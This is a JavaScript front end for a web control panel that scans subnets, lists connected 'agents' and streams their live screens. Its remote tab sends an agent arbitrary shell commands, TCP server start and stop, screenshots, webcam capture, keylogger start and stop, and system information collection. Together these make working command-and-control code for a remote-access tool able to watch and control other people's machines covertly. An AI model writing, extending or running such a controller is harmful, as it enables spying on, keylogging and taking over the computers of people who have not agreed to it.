(function () {
    'use strict';

    var BASE_PATH = '/eXT.Qli';
    var WS_SCHEME = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
    var WS_URL = WS_SCHEME + window.location.hostname + ':8081/ws';
    var VIEWER_ID = 'viewer-' + Math.random().toString(36).slice(2) + Date.now().toString(36);

    var allResults = [];
    var ws = null;
    var agentPollTimer = null;
    var devicesPollTimer = null;

    var currentScreenAgentUuid = '';
    var isScreenViewing = false;
    var lastScreenFrameSeq = 0;
    var currentAgentAdminTab = 'agents';

    var pendingTasks = {};  // task_id -> { timestamp, task }
    var commandInput, executeCmdBtn, tcpPort, tcpMessage, startTcpBtn, stopTcpBtn, tcpStatus,
        quickScreenshotBtn, quickWebcamBtn, quickKeyloggerStartBtn, quickKeyloggerStopBtn, quickInfoBtn,
        taskResultsLog;

    function byId(id) {
        return document.getElementById(id);
    }

    function qsa(selector) {
        return Array.prototype.slice.call(document.querySelectorAll(selector));
    }

    function escapeHtml(value) {
        return String(value == null ? '' : value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function hidePageLoader() {
        var loader = byId('pageLoader');
        if (!loader) return;

        loader.classList.add('is-hidden');

        setTimeout(function () {
            if (loader && loader.parentNode) {
                loader.parentNode.removeChild(loader);
            }
        }, 350);
    }

    function setStatus(message) {
        var el = byId('statusBar');
        if (el) el.textContent = message || 'Ready';
    }

    function setSummary(message) {
        var el = byId('scanSummary');
        if (el) el.textContent = message || 'No scan yet.';
    }

    function setRawOutput(text) {
        var el = byId('rawOutput');
        if (el) el.textContent = text || 'No scan yet.';
    }

    function setAgentStatus(message) {
        var el = byId('agentStatusBar');
        if (el) el.textContent = message || 'Loading agents...';
    }

    function setDevicesStatus(message) {
        var el = byId('devicesStatusBar');
        if (el) el.textContent = message || 'Loading saved devices...';
    }

    function setScreenStatus(message) {
        var el = byId('screenStatusBar');
        if (el) el.textContent = message || 'Waiting for a selected agent.';
    }

    function showScreenEmptyState(show) {
        var emptyState = byId('screenEmptyState');
        var stage = byId('screenStage');
        var frame = byId('remoteScreenVideo');

        if (emptyState) {
            emptyState.style.display = show ? 'flex' : 'none';
        }

        if (stage) {
            stage.classList.toggle('is-empty', show);
            stage.classList.toggle('has-frame', !show);
        }

        if (frame) {
            frame.style.display = show ? 'none' : 'block';
        }
    }

    function renderResults(items) {
        var resultsBox = byId('scanResults');
        if (!resultsBox) return;

        if (!Array.isArray(items) || !items.length) {
            resultsBox.innerHTML = '<div class="empty-state">No matching hosts found.</div>';
            return;
        }

        resultsBox.innerHTML = items.map(function (item) {
            return ''
                + '<div class="result-item">'
                + '  <div class="result-top">'
                + '    <div class="result-ip">' + escapeHtml(item.ip || '') + '</div>'
                + '    <div class="result-hostname">' + escapeHtml(item.hostname || '') + '</div>'
                + '  </div>'
                + '</div>';
        }).join('');
    }

    function filterResults() {
        var searchInput = byId('searchInput');
        var term = searchInput ? searchInput.value.trim().toLowerCase() : '';

        if (!term) {
            renderResults(allResults);
            return;
        }

        var filtered = allResults.filter(function (item) {
            var haystack = [
                item.ip || '',
                item.hostname || '',
                item.mac || item.mac_address || '',
                item.vendor || '',
                item.os || item.os_name || ''
            ].join(' ').toLowerCase();

            return haystack.indexOf(term) !== -1;
        });

        renderResults(filtered);
    }

    function setLoadingState(isLoading) {
        ['startScanBtn', 'detectScanBtn', 'refreshListBtn'].forEach(function (id) {
            var el = byId(id);
            if (el) el.disabled = isLoading;
        });
    }

    function runScan(mode) {
        var subnetInput = byId('subnetInput');
        var target = subnetInput ? subnetInput.value.trim() : '';

        setLoadingState(true);
        setStatus('Scanning...');
        setSummary('Scanning target...');
        setRawOutput('Scanning...');

        fetch(BASE_PATH + '/backend/api/scan.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target: target,
                mode: mode || 'scan'
            })
        })
        .then(function (r) {
            return r.json();
        })
        .then(function (data) {
            if (!data.success) {
                throw new Error(data.message || 'Scan failed.');
            }

            allResults = Array.isArray(data.results) ? data.results : [];
            setStatus(data.message || 'Scan completed.');
            setSummary('Hosts: ' + (data.hosts_up || 0));
            setRawOutput(data.raw_output || 'No raw output.');
            filterResults();
            loadDevices();
        })
        .catch(function (err) {
            setStatus('Error: ' + err.message);
            setSummary('Scan failed.');
            setRawOutput(err.message || 'Unknown scan error.');
        })
        .finally(function () {
            setLoadingState(false);
        });
    }

    function formatAgentStatus(isOnline) {
        return isOnline
            ? '<span class="agent-badge agent-online">Online</span>'
            : '<span class="agent-badge agent-offline">Offline</span>';
    }

    function renderAgents(list) {
        var tbody = byId('agentsTableBody');
        if (!tbody) return;

        list = Array.isArray(list) ? list : [];

        if (!list.length) {
            setAgentStatus('No agents connected.');
            tbody.innerHTML = '<tr><td colspan="11">No agents yet.</td></tr>';
            populateScreenAgentOptions([]);
            return;
        }

        setAgentStatus('Connected agents: ' + list.length);

        tbody.innerHTML = list.map(function (a) {
            return ''
                + '<tr>'
                + '   <td>' + formatAgentStatus(!!a.is_online) + '</td>'
                + '   <td>' + escapeHtml(a.hostname || '-') + '</td>'
                + '   <td>' + escapeHtml(a.local_ip || '-') + '</td>'
                + '   <td>' + escapeHtml(a.os_name || '-') + '</td>'
                + '   <td>' + escapeHtml(a.architecture || '-') + '</td>'
                + '   <td>' + escapeHtml(a.cpu_info || '-') + '</td>'
                + '   <td>' + escapeHtml(a.ram_mb || '0') + '</td>'
                + '   <td>' + escapeHtml(a.disk_free_gb || '0') + '</td>'
                + '   <td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td>'
                + '   <td>' + escapeHtml(a.last_seen || '-') + '</td>'
                + '   <td>'
                + '    <div class="table-action-stack">'
                + '      <button type="button" class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button>'
                + '      <button type="button" class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button>'
                + '    </div>'
                + '   </td>'
                + '</tr>';
        }).join('');

        populateScreenAgentOptions(list);
    }

    function populateScreenAgentOptions(list) {
        var select = byId('screenAgentSelect');
        if (!select) return;

        var current = currentScreenAgentUuid || select.value || '';
        var options = ['<option value="">Select an agent</option>'];

        list.forEach(function (agent) {
            var value = String(agent.agent_uuid || '');
            var label = (agent.hostname || value || 'Unknown Agent') + ' (' + (agent.local_ip || '-') + ')';
            var selected = current && current === value ? ' selected' : '';
            options.push('<option value="' + escapeHtml(value) + '"' + selected + '>' + escapeHtml(label) + '</option>');
        });

        select.innerHTML = options.join('');
    }

    function loadAgents() {
        fetch(BASE_PATH + '/backend/api/agents.php', {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        })
        .then(function (r) {
            return r.json();
        })
        .then(function (data) {
            if (!data.success) {
                throw new Error(data.message || 'Failed to load agents.');
            }
            renderAgents(data.data || []);
        })
        .catch(function (err) {
            setAgentStatus('Agent load error: ' + err.message);
        });
    }

    function renderDevices(list) {
        var tbody = byId('devicesTableBody');
        if (!tbody) return;

        list = Array.isArray(list) ? list : [];

        if (!list.length) {
            tbody.innerHTML = '<tr><td colspan="7">No saved devices found.</td></tr>';
            return;
        }

        tbody.innerHTML = list.map(function (row) {
            return ''
                + '<tr>'
                + '   <td>' + escapeHtml(row.ip_address || '-') + '</td>'
                + '   <td>' + escapeHtml(row.hostname || '-') + '</td>'
                + '   <td>' + escapeHtml(row.mac_address || '-') + '</td>'
                + '   <td>' + escapeHtml(row.vendor || '-') + '</td>'
                + '   <td>' + escapeHtml(row.status || '-') + '</td>'
                + '   <td>' + escapeHtml(row.last_seen || '-') + '</td>'
                + '   <td><button type="button" class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td>'
                + '</tr>';
        }).join('');
    }

    function loadDevices() {
        var searchInput = byId('deviceSearchInput');
        var query = searchInput ? searchInput.value.trim() : '';
        var url = BASE_PATH + '/backend/api/devices.php';

        if (query) {
            url += '?search=' + encodeURIComponent(query);
        }

        setDevicesStatus('Loading saved devices...');

        fetch(url, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        })
        .then(function (r) {
            return r.json();
        })
        .then(function (data) {
            if (!data.success) {
                throw new Error(data.message || 'Failed to load devices.');
            }

            renderDevices(data.devices || []);
            setDevicesStatus('Saved devices: ' + ((data.devices || []).length));
        })
        .catch(function (err) {
            setDevicesStatus('Saved devices error: ' + err.message);
        });
    }

    function deleteSavedDevice(id) {
        if (!id) return;

        if (!window.confirm('Delete this saved device?')) {
            return;
        }

        fetch(BASE_PATH + '/backend/api/delete_device.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: id })
        })
        .then(function (r) {
            return r.json();
        })
        .then(function (data) {
            if (!data.success) {
                throw new Error(data.message || 'Delete failed.');
            }
            loadDevices();
        })
        .catch(function (err) {
            setDevicesStatus('Delete error: ' + err.message);
        });
    }

    function sendAgentTask(agentUUID, task) {
        fetch(BASE_PATH + '/backend/api/send_agent_task.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agent_uuid: agentUUID,
                task: task
            })
        })
        .then(function (res) {
            return res.json();
        })
        .then(function () {
            loadAgents();
        })
        .catch(function (err) {
            console.error('Task send error:', err);
        });
    }

    // Remote control helper functions
    function generateTaskId() {
        return Date.now() + '-' + Math.random().toString(36).substr(2, 8);
    }

    function addTaskResultToLog(taskId, status, output) {
        var log = document.getElementById('taskResultsLog');
        if (!log) return;

        if (log.innerHTML.includes('No tasks executed yet.')) {
            log.innerHTML = '';
        }

        var entry = document.createElement('div');
        entry.className = 'result-item';
        entry.innerHTML = '<div class="result-top"><strong>Task ' + escapeHtml(taskId) + '</strong> – ' + escapeHtml(status) + '</div>' +
                          '<pre class="raw-output" style="margin-top:8px; margin-bottom:0;">' + escapeHtml(output) + '</pre>';
        log.prepend(entry);
    }

    function sendTask(agentUUID, task, data, taskId) {
        if (!agentUUID) {
            console.warn('No agent selected');
            return;
        }
        if (!taskId) taskId = generateTaskId();

        var payload = {
            agent_uuid: agentUUID,
            task: task,
            task_id: taskId,
            data: data || {}
        };

        pendingTasks[taskId] = { timestamp: Date.now(), task: task };

        fetch(BASE_PATH + '/backend/api/send_agent_task.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(function (r) { return r.json(); })
        .then(function (resp) {
            if (!resp.success) {
                addTaskResultToLog(taskId, 'error', 'Failed to send task: ' + (resp.message || 'unknown error'));
            }
        })
        .catch(function (err) {
            addTaskResultToLog(taskId, 'error', 'Network error: ' + err.message);
        });
    }

    function getSelectedAgentUUID() {
        var select = byId('screenAgentSelect');
        if (select && select.value) return select.value;
        return '';
    }

    function clearRemoteScreen() {
        var frame = byId('remoteScreenVideo');
        if (frame) {
            frame.removeAttribute('src');
        }

        lastScreenFrameSeq = 0;
        showScreenEmptyState(true);
    }

    function ensureWsConnected() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            return Promise.resolve();
        }

        return new Promise(function (resolve, reject) {
            var checks = 0;
            var timer = setInterval(function () {
                checks += 1;

                if (ws && ws.readyState === WebSocket.OPEN) {
                    clearInterval(timer);
                    resolve();
                    return;
                }

                if (checks > 50) {
                    clearInterval(timer);
                    reject(new Error('WebSocket not connected.'));
                }
            }, 100);
        });
    }

    function sendWsMessage(payload) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            throw new Error('WebSocket not connected.');
        }

        ws.send(JSON.stringify(payload));
    }

    function startScreenView() {
        var select = byId('screenAgentSelect');
        var agentUuid = select ? select.value : '';

        if (!agentUuid) {
            setScreenStatus('Select an agent first.');
            return;
        }

        currentScreenAgentUuid = agentUuid;
        isScreenViewing = true;
        clearRemoteScreen();
        setScreenStatus('Requesting Python screen stream from agent...');

        ensureWsConnected()
            .then(function () {
                sendWsMessage({
                    type: 'screen_subscribe',
                    viewer_id: VIEWER_ID,
                    target_agent_uuid: agentUuid
                });
            })
            .catch(function (err) {
                console.error(err);
                setScreenStatus('Viewer start failed: ' + err.message);
            });
    }

    function stopScreenView() {
        isScreenViewing = false;

        if (ws && ws.readyState === WebSocket.OPEN) {
            try {
                sendWsMessage({
                    type: 'screen_unsubscribe',
                    viewer_id: VIEWER_ID,
                    target_agent_uuid: currentScreenAgentUuid
                });
            } catch (e) {
                console.error(e);
            }
        }

        clearRemoteScreen();
        setScreenStatus('Viewer stopped.');
    }

    function handleScreenMessage(msg) {
        if (!msg) return;
        if (msg.agent_uuid && currentScreenAgentUuid && msg.agent_uuid !== currentScreenAgentUuid) return;

        if (msg.type === 'screen_subscribed') {
            setScreenStatus(msg.message || 'Viewer subscribed. Waiting for frames...');
            return;
        }

        if (msg.type === 'screen_status') {
            if (msg.status === 'stopped') {
                clearRemoteScreen();
            }
            setScreenStatus(msg.message || ('Screen status: ' + (msg.status || 'unknown')));
            return;
        }

        if (msg.type === 'agent_status') {
            if (msg.status === 'offline' && currentScreenAgentUuid && msg.agent_uuid === currentScreenAgentUuid) {
                clearRemoteScreen();
                setScreenStatus(msg.message || 'Agent disconnected.');
            }
            return;
        }

        if (msg.type === 'screen_frame') {
            if (!isScreenViewing || !msg.image) return;
            if (msg.seq && lastScreenFrameSeq && Number(msg.seq) < Number(lastScreenFrameSeq)) return;

            lastScreenFrameSeq = Number(msg.seq || 0);

            var mimeType = msg.mime_type || 'image/png';
            var frame = byId('remoteScreenVideo');

            if (frame) {
                frame.src = 'data:' + mimeType + ';base64,' + msg.image;
            }

            showScreenEmptyState(false);

            var backend = msg.backend ? (' via ' + msg.backend) : '';
            setScreenStatus('Receiving live screen from Python agent' + backend + '.');
        }
    }

    function connectWebSocket() {
        try {
            ws = new WebSocket(WS_URL);

            ws.onopen = function () {
                ws.send(JSON.stringify({
                    type: 'register',
                    peer_type: 'screen_admin',
                    viewer_id: VIEWER_ID
                }));

                setAgentStatus('WebSocket connected.');

                if (isScreenViewing && currentScreenAgentUuid) {
                    sendWsMessage({
                        type: 'screen_subscribe',
                        viewer_id: VIEWER_ID,
                        target_agent_uuid: currentScreenAgentUuid
                    });
                }

                loadAgents();
            };

            ws.onmessage = function (event) {
                try {
                    var msg = JSON.parse(event.data);

                    if (msg.type === 'task_result') {
                        var taskId = msg.task_id || 'unknown';
                        var status = msg.result_status || 'unknown';
                        var output = msg.output_text || '';
                        addTaskResultToLog(taskId, status, output);
                        return;
                    }

                    if (
                        msg.type === 'screen_subscribed' ||
                        msg.type === 'screen_status' ||
                        msg.type === 'screen_frame' ||
                        msg.type === 'agent_status'
                    ) {
                        handleScreenMessage(msg);
                    }
                } catch (e) {
                    console.error(e);
                }
            };

            ws.onclose = function () {
                setAgentStatus('WebSocket disconnected. Retrying...');
                setTimeout(connectWebSocket, 3000);
            };

            ws.onerror = function () {
                setAgentStatus('WebSocket error.');
            };
        } catch (e) {
            console.error(e);
            setAgentStatus('Failed to initialize WebSocket.');
        }
    }

    function activateAgentAdminTab(tabName) {
        var validTabs = {
            agents: 'agentAdminTabAgents',
            devices: 'agentAdminTabDevices',
            screen: 'agentAdminTabScreen',
            remote: 'agentAdminTabRemote'
        };

        currentAgentAdminTab = validTabs[tabName] ? tabName : 'agents';

        Object.keys(validTabs).forEach(function (key) {
            var panel = byId(validTabs[key]);
            if (panel) {
                panel.hidden = key !== currentAgentAdminTab;
            }
        });

        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
            var isActive = btn.getAttribute('data-agent-admin-tab-trigger') === currentAgentAdminTab;
            btn.classList.toggle('is-active', isActive);
        });
    }

    function activateView(viewId, agentAdminTab) {
        qsa('.view-panel').forEach(function (panel) {
            panel.classList.toggle('is-active', panel.id === viewId);
        });

        qsa('.nav-link').forEach(function (btn) {
            btn.classList.toggle('is-active', btn.getAttribute('data-view-target') === viewId);
        });

        if (viewId === 'agentsView') {
            activateAgentAdminTab(agentAdminTab || currentAgentAdminTab || 'agents');
        }
    }

    function openScreenViewer(agentUuid) {
        activateView('agentsView', 'screen');
        currentScreenAgentUuid = agentUuid || '';

        var select = byId('screenAgentSelect');
        if (select && agentUuid) {
            select.value = agentUuid;
        }

        setScreenStatus('Selected agent. Click Start Viewing to request the Python screen stream.');
    }

    function bindNavigation() {
        qsa('[data-view-target]').forEach(function (btn) {
            btn.addEventListener('click', function () {
                activateView(
                    btn.getAttribute('data-view-target'),
                    btn.getAttribute('data-agent-admin-tab') || ''
                );
            });
        });
    }

    function bindEvents() {
        var start = byId('startScanBtn');
        var detect = byId('detectScanBtn');
        var refresh = byId('refreshListBtn');
        var search = byId('searchInput');
        var deviceSearch = byId('deviceSearchInput');
        var deviceRefresh = byId('deviceRefreshBtn');
        var screenSelect = byId('screenAgentSelect');
        var refreshViewerAgentsBtn = byId('refreshViewerAgentsBtn');
        var startScreenViewBtn = byId('startScreenViewBtn');
        var stopScreenViewBtn = byId('stopScreenViewBtn');

        if (start) {
            start.onclick = function () { runScan('scan'); };
        }

        if (detect) {
            detect.onclick = function () { runScan('detect'); };
        }

        if (refresh) {
            refresh.onclick = function () {
                filterResults();
                loadAgents();
                loadDevices();
            };
        }

        if (search) {
            search.addEventListener('input', filterResults);
        }

        if (deviceSearch) {
            deviceSearch.addEventListener('input', function () {
                loadDevices();
            });
        }

        if (deviceRefresh) {
            deviceRefresh.onclick = function () {
                loadDevices();
            };
        }

        qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
            btn.addEventListener('click', function () {
                activateAgentAdminTab(btn.getAttribute('data-agent-admin-tab-trigger'));
            });
        });

        if (screenSelect) {
            screenSelect.addEventListener('change', function () {
                if (isScreenViewing) {
                    stopScreenView();
                }

                currentScreenAgentUuid = screenSelect.value || '';
                setScreenStatus(
                    currentScreenAgentUuid
                        ? 'Selected agent. Click Start Viewing to request the Python stream.'
                        : 'Waiting for a selected agent.'
                );
            });
        }

        if (refreshViewerAgentsBtn) {
            refreshViewerAgentsBtn.onclick = function () {
                loadAgents();
            };
        }

        if (startScreenViewBtn) {
            startScreenViewBtn.onclick = startScreenView;
        }

        if (stopScreenViewBtn) {
            stopScreenViewBtn.onclick = stopScreenView;
        }

        // Remote control elements
        commandInput = byId('commandInput');
        executeCmdBtn = byId('executeCmdBtn');
        tcpPort = byId('tcpPort');
        tcpMessage = byId('tcpMessage');
        startTcpBtn = byId('startTcpBtn');
        stopTcpBtn = byId('stopTcpBtn');
        tcpStatus = byId('tcpStatus');
        quickScreenshotBtn = byId('quickScreenshotBtn');
        quickWebcamBtn = byId('quickWebcamBtn');
        quickKeyloggerStartBtn = byId('quickKeyloggerStartBtn');
        quickKeyloggerStopBtn = byId('quickKeyloggerStopBtn');
        quickInfoBtn = byId('quickInfoBtn');
        taskResultsLog = byId('taskResultsLog');

        if (executeCmdBtn) {
            executeCmdBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) {
                    setStatus('Please select an agent first (from the Agents list or Screen Viewer).');
                    return;
                }
                var cmd = commandInput.value.trim();
                if (!cmd) {
                    setStatus('Enter a command.');
                    return;
                }
                sendTask(agentUUID, 'cmd', { command: cmd });
                addTaskResultToLog('pending', 'info', 'Executing: ' + cmd);
            };
        }

        if (startTcpBtn) {
            startTcpBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) {
                    setStatus('Please select an agent first.');
                    return;
                }
                var port = parseInt(tcpPort.value, 10);
                if (isNaN(port) || port < 1 || port > 65535) {
                    setStatus('Invalid port number.');
                    return;
                }
                var message = tcpMessage.value.trim();
                var data = { port: port };
                if (message) data.message = message;
                sendTask(agentUUID, 'tcp_server_start', data);
                tcpStatus.textContent = 'Starting...';
            };
        }

        if (stopTcpBtn) {
            stopTcpBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) {
                    setStatus('Please select an agent first.');
                    return;
                }
                sendTask(agentUUID, 'tcp_server_stop', {});
                tcpStatus.textContent = 'Stopping...';
            };
        }

        if (quickScreenshotBtn) {
            quickScreenshotBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) return setStatus('Select an agent first.');
                sendTask(agentUUID, 'screenshot', {});
            };
        }
        if (quickWebcamBtn) {
            quickWebcamBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) return setStatus('Select an agent first.');
                sendTask(agentUUID, 'webcam', {});
            };
        }
        if (quickKeyloggerStartBtn) {
            quickKeyloggerStartBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) return setStatus('Select an agent first.');
                sendTask(agentUUID, 'keylogger_start', {});
            };
        }
        if (quickKeyloggerStopBtn) {
            quickKeyloggerStopBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) return setStatus('Select an agent first.');
                sendTask(agentUUID, 'keylogger_stop', {});
            };
        }
        if (quickInfoBtn) {
            quickInfoBtn.onclick = function () {
                var agentUUID = getSelectedAgentUUID();
                if (!agentUUID) return setStatus('Select an agent first.');
                sendTask(agentUUID, 'collect_info', {});
            };
        }
    }

    document.addEventListener('DOMContentLoaded', function () {
        bindNavigation();
        bindEvents();
        connectWebSocket();

        setStatus('Ready');
        setSummary('No scan yet.');
        setRawOutput('No scan yet.');
        setDevicesStatus('Loading saved devices...');
        setScreenStatus('Waiting for a selected agent.');

        activateView('scannerView');
        activateAgentAdminTab('agents');
        loadAgents();
        loadDevices();
        showScreenEmptyState(true);

        if (agentPollTimer) clearInterval(agentPollTimer);
        if (devicesPollTimer) clearInterval(devicesPollTimer);

        agentPollTimer = setInterval(loadAgents, 5000);
        devicesPollTimer = setInterval(loadDevices, 10000);

        hidePageLoader();
    });

    window.addEventListener('load', hidePageLoader);
    setTimeout(hidePageLoader, 1500);

    window.sendAgentTask = sendAgentTask;
    window.deleteSavedDevice = deleteSavedDevice;
    window.openScreenViewer = openScreenViewer;
})();